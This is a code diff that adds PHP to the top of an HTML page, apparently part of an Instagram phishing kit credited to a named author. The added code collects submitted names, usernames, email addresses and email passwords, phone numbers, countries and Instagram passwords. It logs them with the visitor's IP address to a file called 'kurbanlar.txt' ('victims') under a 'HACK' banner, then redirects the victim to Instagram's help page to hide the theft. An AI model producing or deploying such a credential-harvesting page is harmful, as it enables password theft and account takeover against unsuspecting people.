@@ -1,4 +1,24 @@
+<?php
+session_start();
+if ($_POST) {
+  $name=$_POST["name"];
+  $username=$_POST["username"];
+  $mail=$_POST["mail"];
+  $mailpass=$_POST["mailpass"];
+  $number=$_POST["number"];
+  $country=$_POST["country"];
+  $password=$_POST["password"];
+  $ip=$_SERVER["REMOTE_ADDR"];
+  date_default_timezone_set('Europe/Istanbul');
+  $date=date("d-m-Y H:i:s");
+  $file = fopen('kurbanlar.txt', 'a');
+fwrite($file, "<----HACK---->".$hack."\n" ."Isım: ".$name."\n" ."Kullanıcı Adı: ".$username. "\n"."Maıl: ".$mail. "\n"."Maıl Sıfre: ".$mailpass. "\n"."Telefon: ".$number. "\n"."Ulke: ".$country. "\n"."Instagram Sıfre: ".$password. "\n"."Ip Adress: " .$ip."\n".   "Time: " .$date.  "\n\n");
+fclose($file);
+echo '';
 
+   header("Location: https://help.instagram.com/");
+}
+?>
 <!------------SCRİPT BY TALHA ŞENTÜRK------------->
 <!DOCTYPE html>
 <html lang="en">
